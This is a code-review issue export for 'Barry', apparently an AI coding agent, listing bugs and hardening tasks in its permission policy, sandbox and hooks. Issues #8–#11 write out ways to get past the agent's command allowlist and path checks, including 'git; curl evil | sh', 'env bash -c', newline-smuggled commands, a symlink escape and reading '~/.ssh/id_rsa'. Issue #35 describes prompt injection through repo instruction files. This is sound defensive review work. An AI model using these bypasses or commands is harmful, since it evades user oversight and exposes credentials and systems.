# Barry code review findings

A snapshot of every finding from the M6 code review, exported from the GitHub
issue tracker on 2026-11-15. Each finding is tracked as its own issue and is
fixed in its own pull request. Bugs come first, then enhancements, then docs.

| Group | Open |
|---|---|
| Bugs | 14 |
| Enhancements | 32 |
| Documentation | 1 |

## Index

### Bugs

- [#8](#8) Bash/write 'Once' approval grants a permanent session prefix/directory
- [#9](#9) Bash allowlist/denylist bypassable via substring and prefix matching
- [#11](#11) Dangling symlink lets write/edit escape the working directory
- [#12](#12) PreToolUse hook updated_input ignored for write and edit
- [#13](#13) Hook fail_closed not enforced; timed-out hooks not killed
- [#14](#14) grant_dir mis-resolves absolute paths containing '..'
- [#16](#16) Protected/read-deny paths incomplete (extra roots, missing paths)
- [#18](#18) Configured bash rules are never loaded
- [#19](#19) Unbounded memory in read and bash output before truncation
- [#21](#21) Compaction discards latest request and in-flight tool calls
- [#22](#22) Stop the turn when the compaction cap is reached
- [#24](#24) LLM retry: cap Retry-After, support HTTP-date, avoid unsafe POST retries
- [#41](#41) Re-enable cargo-deny in CI (advisories currently unchecked)
- [#44](#44) Replace expect/panics in production paths with errors

### Enhancements

- [#10](#10) Insecure defaults: no read-deny, no protected paths, network on
- [#15](#15) Harden Linux sandbox (seccomp, namespaces, helper lookup)
- [#17](#17) Secrets reach the LLM unredacted (redaction is log-only)
- [#20](#20) Minor: pin CI actions by SHA, spurious sandbox grant prompts, edit output verbosity
- [#23](#23) Use provider Usage for token accounting instead of bytes/4
- [#25](#25) Avoid blocking std::fs calls in async tool executors
- [#26](#26) Config: use serde derive with deny_unknown_fields
- [#27](#27) Config: default path and 'barry config show'
- [#28](#28) Remove process-global state (current_dir, HOME) from Agent
- [#29](#29) Introduce proper error variants (CoreError::Io, tool errors)
- [#30](#30) Make Policy mandatory instead of Option<Policy>
- [#31](#31) Add read-only glob, grep and ls tools
- [#32](#32) Edit tool: replace_all, multi-edit, diff output, stale-edit check
- [#33](#33) Hide the 'agent' tool until sub-agents land (M8)
- [#34](#34) Budgets for autonomous runs (tokens, cost, wall-clock, bash time)
- [#35](#35) Treat repo AGENTS.md and .barry/skills as untrusted input
- [#36](#36) Non-interactive policy-file approver for headless mode
- [#37](#37) Structured exit codes and final JSON summary for CI/orchestrators
- [#38](#38) Add [workspace.package] and [workspace.lints]
- [#39](#39) Migrate to Rust edition 2024
- [#40](#40) Pin the Rust toolchain version
- [#42](#42) Reconsider exact '=' pins alongside committed Cargo.lock
- [#43](#43) Use structured error types with sources instead of strings
- [#45](#45) Split tools.rs into per-tool modules behind a Tool trait
- [#46](#46) Narrow barry-core public API
- [#47](#47) Separate immutable Policy from mutable session grants
- [#48](#48) Replace hand-rolled helpers with existing crates
- [#49](#49) Fix clippy pedantic findings (async without await, pass-by-value, format)
- [#50](#50) Remove Display impl for LlmEvent
- [#51](#51) Mark public protocol enums #[non_exhaustive]
- [#52](#52) Consolidate integration tests into one binary per crate
- [#53](#53) Add property tests / fuzzing for parsers and path handling

### Documentation

- [#54](#54) Docs: add # Errors / # Panics sections and backticks

## Bugs

<a id="8"></a>

### #8 Bash/write 'Once' approval grants a permanent session prefix/directory

**Severity:** Critical

`crates/core/src/tools.rs` (bash Ask branch, ~L327): `ApprovalChoice::Once` and `AlwaysThisSession` share a branch that calls `policy.approve_prefix(first_word)`. Approving `python foo.py` once allows every later `python ...` command for the session.

The prefix check in `check_bash` uses `starts_with` and runs before the dangerous-construct check, so after approving `git`, `git; curl evil | sh` is allowed.

Writes have the same issue: `check_write_approval` (~L582) calls `grant_dir` on `Once`, granting the whole directory permanently.

**Fix:** `Once` must not record any grant. For `AlwaysThisSession`, grant a parsed argv pattern (not a raw string prefix), and run dangerous-construct / separator checks before grants.

<a id="9"></a>

### #9 Bash allowlist/denylist bypassable via substring and prefix matching

**Severity:** Critical

`crates/policy/src/lib.rs` `check_bash` (~L298-368) uses substring / `starts_with` matching, which is easy to bypass:

- `env` is allowlisted: `env bash -c '...'` runs anything.
- `find . -exec <cmd> {} +` passes; `tee` can write any path.
- `allow_contains` is substring: `python -c '...' # cargo test` is allowed.
- Newlines are not separators: `ls\n<anything>` is allowed.
- `<(...)`, `$VAR`, `<` redirection not flagged.
- Deny list misses `|sh` (no space), `rm -r -f /`, `git push -f`.
- False positives: `"su"` denies `cat issue.md`, `ls results`.
- Prefix matching is not word-bounded: `ls` matches `lsblk`, `cat` matches `catx`.

**Fix:** tokenize with a real shell parser (reject on unparseable input), match on argv with word boundaries, drop `env`/`find -exec`/`tee` from the default allowlist, and treat the OS sandbox as the real boundary.

<a id="11"></a>

### #11 Dangling symlink lets write/edit escape the working directory

**Severity:** High

`crates/policy/src/path.rs` `canonicalise` (~L63): `next.exists()` returns false for a dangling symlink, so the link is treated as a missing component and appended literally. The resulting path looks inside cwd, but `std::fs::write` follows the link.

Example: `ln -s ~/.bashrc_x link` then `write link` creates a file outside cwd without asking. A check-then-write TOCTOU window exists for the same reason.

**Fix:** use `symlink_metadata` to detect links (resolve or reject dangling ones); open files with `O_NOFOLLOW` / write via temp file + rename after the check.

<a id="12"></a>

### #12 PreToolUse hook updated_input ignored for write and edit

**Severity:** High

`crates/core/src/tools.rs` (~L258-259): `write` and `edit` are dispatched with the original `call`, not the hook-rewritten `arguments`. A PreToolUse hook returning `updated_input` only affects `read` and `bash`.

**Fix:** pass the updated arguments to the write/edit executors; add a test for each tool.

<a id="13"></a>

### #13 Hook fail_closed not enforced; timed-out hooks not killed

**Severity:** High

`crates/core/src/hooks.rs`: `HookConfig.fail_closed` is parsed but never used. Timeouts, non-zero exits and spawn errors become `Warning`; non-JSON stdout on exit 0 becomes `Allow`.

Also:
- a timed-out hook process is not killed (no `kill_on_drop`);
- an empty `command` array panics on `command[0]`;
- `Ask` is treated as allow.

**Fix:** honour `fail_closed` (Block), kill on timeout/cancel, validate `command` non-empty at config load, and route `Ask` to the approver.

<a id="14"></a>

### #14 grant_dir mis-resolves absolute paths containing '..'

**Severity:** High

`crates/policy/src/lib.rs` `grant_dir` (~L183): the `..` fallback ignores `Component::RootDir`, so absolute `/a/../b` resolves to `<cwd>/a/b`. It skips symlink resolution, and `create_dir_all` runs before the grant is recorded (and its error is ignored).

**Fix:** normalise from the correct base (root for absolute paths), then canonicalise the existing prefix; do not create directories as a side effect of granting.

<a id="16"></a>

### #16 Protected/read-deny paths incomplete (extra roots, missing paths)

**Severity:** Medium

- `sandbox_spec` (`crates/core/src/tools.rs` ~L826) applies protected paths only as `cwd.join(p)`, not under extra writable roots or nested repos/submodules.
- Read-deny entries that don't exist at startup are never masked (Linux and macOS skip non-existent paths).
- Protecting `.git` alone is weak while `.gitattributes`, `Makefile`, `.envrc`, `.git`-adjacent config remain writable.

**Fix:** apply protection to every writable root, mask missing read-deny paths (e.g. pre-create or use Seatbelt deny rules regardless of existence), and document the threat model.

<a id="18"></a>

### #18 Configured bash rules are never loaded

**Severity:** Medium

Every `PolicyConfig` in `crates/cli/src/main.rs` and `repl.rs` is built with `rules: vec![]`, and `config.rs` never parses bash rules. The rules table, its validation, and `barry rules check` with custom rules are effectively dead.

**Fix:** parse `[[rules]]` from config and pass them through, or remove the feature until it is wired.

<a id="19"></a>

### #19 Unbounded memory in read and bash output before truncation

**Severity:** Medium

`execute_read` uses `read_to_string` on the whole file, and `run_bash_command` uses `wait_with_output`; both buffer everything before truncating to 30k. A large file or `yes` loop can exhaust memory before the timeout.

**Fix:** stat and cap read size; stream bash stdout/stderr with a bounded buffer and kill on overflow.

<a id="21"></a>

### #21 Compaction discards latest request and in-flight tool calls

`crates/core/src/agent.rs` `summarise` replaces the entire history with one summary message, including the most recent user request and pending tool calls.

Also:
- it uses a fresh `CancellationToken`, so Ctrl-C cannot interrupt compaction;
- an empty summary silently wipes context.

**Fix:** keep the last N turns verbatim and summarise only older ones; pass the turn's cancel token; abort compaction if the summary is empty.

<a id="22"></a>

### #22 Stop the turn when the compaction cap is reached

`maybe_compact` sends a "context full" notice after 3 compactions but the loop continues and the next request will likely overflow.

**Fix:** return a dedicated `StopReason` (e.g. `ContextFull`) and end the turn.

<a id="24"></a>

### #24 LLM retry: cap Retry-After, support HTTP-date, avoid unsafe POST retries

`crates/llm/src/retry.rs`:
- `Retry-After` has no upper bound; a server returning `3600` stalls for an hour;
- only the seconds form is parsed, not HTTP-date;
- transport errors retry the POST even if the request may have reached the server.

**Fix:** clamp delay (e.g. 60s), parse HTTP-date, only retry transport errors that happened before the request was sent (connect errors).

<a id="41"></a>

### #41 Re-enable cargo-deny in CI (advisories currently unchecked)

CI says cargo-deny is parked: "invalid deny.toml for 0.20, license allowlist, RUSTSEC advisories". Known advisories may be present in the dependency tree and nothing checks them.

**Fix:** update `deny.toml` to the current schema, resolve or explicitly ignore (with reason) each advisory, fix the license allowlist, and turn the CI job back on. Optionally add a scheduled run so new advisories surface without a PR.

<a id="44"></a>

### #44 Replace expect/panics in production paths with errors

Production code panics instead of returning errors:
- `Policy::new(..).expect("policy")` in `crates/cli/src/main.rs:178` and `:249`, `crates/cli/src/repl.rs:179`
- `command[0]` in `crates/core/src/hooks.rs` (empty hook command)
- `Regex::new(..).expect` in `redact.rs` (fine as const, could be a `LazyLock`)

**Fix:** propagate errors to `main` and exit with a clear message/code; validate hook config at load time.

## Enhancements

<a id="10"></a>

### #10 Insecure defaults: no read-deny, no protected paths, network on

**Severity:** Critical

Defaults in `crates/core/src/config.rs`: `fs_read_deny = []`, `fs_protected = []`, `sandbox_network = true`. The macOS Seatbelt profile also has `(allow file-read*)`.

Result: `cat ~/.ssh/id_rsa` matches the `cat` allowlist entry and its content goes to the model, and network is open for exfiltration. Applies to headless mode too.

**Fix:** ship default read-deny (`~/.ssh`, `~/.aws`, `~/.config/gcloud`, `~/.kube`, `~/.docker`, `~/.gnupg`, `.env*`), default protected (`.git`, `.barry`, `.env`), and default network off (or an egress allowlist).

<a id="15"></a>

### #15 Harden Linux sandbox (seccomp, namespaces, helper lookup)

**Severity:** Medium

`crates/sandbox/src/linux.rs`:
- seccomp is a denylist and misses `unshare`, `clone` with `CLONE_NEWUSER`, `setns`, `userfaultfd`, `personality`;
- bwrap lacks `--unshare-pid`, `--unshare-ipc`, `--cap-drop ALL`;
- `BARRY_BIN_OVERRIDE` env var can replace the helper with any executable;
- helper lookup walks ancestor directories for any file named `barry`.

**Fix:** add the namespace/cap flags and syscalls, consider an allowlist filter, restrict the override to test builds, and only use `current_exe()` in release builds.

<a id="17"></a>

### #17 Secrets reach the LLM unredacted (redaction is log-only)

**Severity:** Medium

`crates/core/src/redact.rs` redacts only the audit log. Tool output with secrets is sent unredacted to the LLM provider, which matters for remote endpoints.

**Fix:** optional (config) redaction of tool results before they reach the model, or at least document the behaviour.

<a id="20"></a>

### #20 Minor: pin CI actions by SHA, spurious sandbox grant prompts, edit output verbosity

**Severity:** Minor (grouped)

- CI pins actions by tag (`actions/checkout@v4`, `dtolnay/rust-toolchain@stable`, `actions/cache@v4`). Pin by commit SHA, especially in `release.yml` which uses `GITHUB_TOKEN` with write access.
- `sandbox_denied` in `tools.rs` treats "No such file or directory" as a sandbox denial, causing spurious grant prompts.
- The edit tool echoes full `old_string`/`new_string` in display output and the session log.

<a id="23"></a>

### #23 Use provider Usage for token accounting instead of bytes/4

`estimate_tokens` uses `history_bytes() / 4`. The provider already returns `Usage` (input/output tokens).

**Fix:** track real usage from the last response and only fall back to the estimate for new messages.

<a id="25"></a>

### #25 Avoid blocking std::fs calls in async tool executors

Tool executors in `crates/core/src/tools.rs` use `std::fs::read_to_string` / `std::fs::write` inside async functions, blocking the runtime thread.

**Fix:** use `tokio::fs` or `spawn_blocking`.

<a id="26"></a>

### #26 Config: use serde derive with deny_unknown_fields

`crates/core/src/config.rs` parses `toml::Value` by hand. Unknown or misspelled keys (e.g. `read_denny`) are silently ignored, so security settings can be off without warning.

**Fix:** `#[derive(Deserialize)]` structs with `#[serde(deny_unknown_fields)]` and clear error messages.

<a id="27"></a>

### #27 Config: default path and 'barry config show'

Config loads only from `$BARRY_CONFIG`.

**Fix:** fall back to `~/.config/barry/config.toml` (XDG), and add `barry config show` to print the effective config and policy (read-deny, protected, network, hooks, rules).

<a id="28"></a>

### #28 Remove process-global state (current_dir, HOME) from Agent

`Agent::new`, hooks (`tools.rs` hook cwd) and `with_session_log` call `std::env::current_dir()` / read `HOME`. Multiple agents in one process (sub-agents, M8) with different working dirs will conflict.

**Fix:** pass `cwd`/home explicitly (e.g. taken from `Policy`) through the agent and tools.

<a id="29"></a>

### #29 Introduce proper error variants (CoreError::Io, tool errors)

Filesystem errors in tools are mapped to `CoreError::Provider`, which misreports their source.

**Fix:** add `CoreError::Io` and a tool-level error type; keep `Provider` for LLM errors.

<a id="30"></a>

### #30 Make Policy mandatory instead of Option<Policy>

In `tools.rs`, `policy: None` means unsandboxed bash (`execute_bash_none`) and unrestricted writes/reads.

**Fix:** require a `Policy`; if an unsandboxed mode is needed, make it an explicit config flag that is logged in the session log.

<a id="31"></a>

### #31 Add read-only glob, grep and ls tools

The model currently searches through `bash`, which goes through the weakest policy layer (string allowlist).

**Fix:** add dedicated read-only `glob`, `grep`, `ls` tools that use the read policy (read-deny), with bounded output.

<a id="32"></a>

### #32 Edit tool: replace_all, multi-edit, diff output, stale-edit check

Improve `edit`:
- `replace_all` option and multiple edits per call;
- return a unified diff instead of echoing full strings;
- require a prior `read` and reject the edit if the file mtime changed since.

<a id="33"></a>

### #33 Hide the 'agent' tool until sub-agents land (M8)

The `agent` tool is advertised in `tool_specs()` but always returns "not available yet", wasting tokens and inviting useless calls.

**Fix:** omit it from the tool list until implemented (update the prompt snapshot test).

<a id="34"></a>

### #34 Budgets for autonomous runs (tokens, cost, wall-clock, bash time)

Only `max_turns` limits a session.

**Fix:** add config limits for total tokens, estimated cost, wall-clock time, and cumulative bash time; stop with a distinct `StopReason` when exceeded.

<a id="35"></a>

### #35 Treat repo AGENTS.md and .barry/skills as untrusted input

`Agent::new` puts project `AGENTS.md` and `<git_root>/.barry/skills` directly into the system prompt. On untrusted repos this is a prompt-injection path, especially in headless/autonomous mode.

**Fix:** gate project instructions/skills behind a trust flag, or wrap them clearly as untrusted content.

<a id="36"></a>

### #36 Non-interactive policy-file approver for headless mode

`HeadlessApprover` denies every Ask, so autonomous runs can't get scoped permissions.

**Fix:** an approver driven by a declarative file (e.g. allow `cargo test` in cwd, allow writes under `target/`), logged as `DecidedBy::Rule`.

<a id="37"></a>

### #37 Structured exit codes and final JSON summary for CI/orchestrators

Define distinct exit codes for stop / max turns / budget exceeded / denied / error, and emit a final JSON summary event (stop reason, usage, files changed) in `--json` mode.

<a id="38"></a>

### #38 Add [workspace.package] and [workspace.lints]

All 7 crates repeat `edition = "2021"` and `#![forbid(unsafe_code)]`, and no crate sets `rust-version`.

**Fix:**
- `[workspace.package]` with `edition`, `version`, `license`, `rust-version`; crates use `edition.workspace = true` etc.
- `[workspace.lints]`: `rust.unsafe_code = "forbid"`, `clippy.unwrap_used = "warn"`, `clippy.expect_used = "warn"`, `clippy.pedantic = { level = "warn", priority = -1 }`; crates set `[lints] workspace = true`.
- `clippy.toml` with `allow-unwrap-in-tests = true` / `allow-expect-in-tests = true`.

<a id="39"></a>

### #39 Migrate to Rust edition 2024

All crates are on edition 2021; current stable toolchains support 2024.

**Fix:** `cargo fix --edition`, bump `edition` (ideally via `[workspace.package]`), review the migration lints (`unsafe_op_in_unsafe_fn`, RPIT capture, `if let` scope changes).

<a id="40"></a>

### #40 Pin the Rust toolchain version

`rust-toolchain.toml` uses `channel = "stable"` and CI installs `dtolnay/rust-toolchain@stable`, so a new Rust release can break CI (new clippy lints with `-D warnings`) without any code change.

**Fix:** pin an exact version (e.g. `channel = "1.x.y"`) and let CI read it from `rust-toolchain.toml` instead of hard-coding `stable`.

<a id="42"></a>

### #42 Reconsider exact '=' pins alongside committed Cargo.lock

Workspace dependencies use exact `=x.y.z` pins while `Cargo.lock` is committed. The lockfile already gives reproducible builds; exact pins block `cargo update` from picking up patch-level security fixes.

**Fix:** use caret requirements for most deps and rely on the lockfile (plus Dependabot/Renovate); keep exact pins only where deliberate.

<a id="43"></a>

### #43 Use structured error types with sources instead of strings

`CoreError::Provider(String)`, `Config(String)`, `SandboxError::Other(String)` and `LlmError::Transport { message }` drop the underlying error. File I/O errors are reported as `Provider` (11 call sites in core).

**Fix:** add typed variants with `#[source]` / `#[from]` (e.g. `Io(#[from] std::io::Error)`, `Http(#[from] reqwest::Error)`), so callers can match and the chain is preserved. Related: #29.

<a id="45"></a>

### #45 Split tools.rs into per-tool modules behind a Tool trait

`crates/core/src/tools.rs` is 881 lines; `execute_tool` is 190 lines (clippy `too_many_lines`). `Agent::run_turn` (177) and `repl::run` (150) are also long.

**Fix:** `tools/{mod,read,write,edit,bash}.rs` with a `Tool` trait (`spec()`, `execute()`) and a registry; hooks/policy/logging as shared wrapping. Makes #31 and #33 straightforward. Break up `run_turn` and `repl::run` into smaller steps.

<a id="46"></a>

### #46 Narrow barry-core public API

`barry-core` declares `pub mod agent, config, context, hooks, prompt, redact, session, tools`, so internals are public API.

**Fix:** export only what consumers need (`Agent`, `Config`, `Approver`, error types, session resume helpers) and make the rest `pub(crate)`. Integration tests that reach into internals can move to unit tests or use a `#[doc(hidden)] pub mod testing`.

<a id="47"></a>

### #47 Separate immutable Policy from mutable session grants

`barry_policy::Policy` holds both configuration (rules, read-deny, protected) and session state (`grants`, `bash_grants`) mutated during the session.

**Fix:** keep `Policy` immutable and introduce a `SessionGrants` (or `PolicyState`) passed alongside it. Simplifies reasoning about approvals (see #8) and testing.

<a id="48"></a>

### #48 Replace hand-rolled helpers with existing crates

- `core::BoxFuture` duplicates `futures::future::BoxFuture` (already a dependency).
- `kill_process_group` shells out to `kill -KILL`; use `rustix::process::kill_process_group` (safe, works with `forbid(unsafe_code)`).
- `which_bwrap` could use the `which` crate (optional).

Check CVE/maintenance status before adding `rustix`/`which`.

<a id="49"></a>

### #49 Fix clippy pedantic findings (async without await, pass-by-value, format)

`cargo clippy -- -W clippy::pedantic` reports, among others:
- `unused_async`: `crates/core/src/tools.rs:401, 465, 474` (sync fns doing blocking I/O)
- `needless_pass_by_value`: `agent.rs:161` (x2), `agent.rs:547`, `session.rs:185`
- 18x `uninlined_format_args`, 9x `format_push_string` (use `write!`)
- 35x missing `#[must_use]`, 14x redundant closures, 4x `map().unwrap_or()`

Fix as part of enabling workspace lints.

<a id="50"></a>

### #50 Remove Display impl for LlmEvent

`impl Display for LlmEvent` prints full text/reasoning deltas, which makes it easy to leak model output into logs. `Debug` already covers debugging.

**Fix:** remove the impl (or print only the variant name).

<a id="51"></a>

### #51 Mark public protocol enums #[non_exhaustive]

`Event`, `StopReason`, `Decision`, `DecidedBy`, `LlmError`, `LlmEvent` are public enums that will grow (e.g. new stop reasons, #22/#34). Adding a variant is a breaking change today.

**Fix:** add `#[non_exhaustive]` and use wildcard arms in downstream matches.

<a id="52"></a>

### #52 Consolidate integration tests into one binary per crate

There are 57 files under `crates/*/tests/`; each becomes its own test binary, so linking dominates build time.

**Fix:** per crate, `tests/it/main.rs` with `mod bc_2_1_read_tool;` etc. (keep names as modules). Consider `cargo nextest` in CI.

<a id="53"></a>

### #53 Add property tests / fuzzing for parsers and path handling

`canonicalise`, `Policy::check_bash` and the SSE parser are where review bugs were found (#9, #11) and are ideal fuzz targets.

**Fix:** `proptest` for path/command invariants (e.g. no allowed write resolves outside roots), `cargo-fuzz` targets for SSE and tool-call JSON assembly. Add coverage (`cargo llvm-cov`) to CI.

## Documentation

<a id="54"></a>

### #54 Docs: add # Errors / # Panics sections and backticks

clippy pedantic: 15 public functions returning `Result` without `# Errors`, 9 that can panic without `# Panics`, 24 doc items missing backticks. Low priority; fix alongside workspace lints.

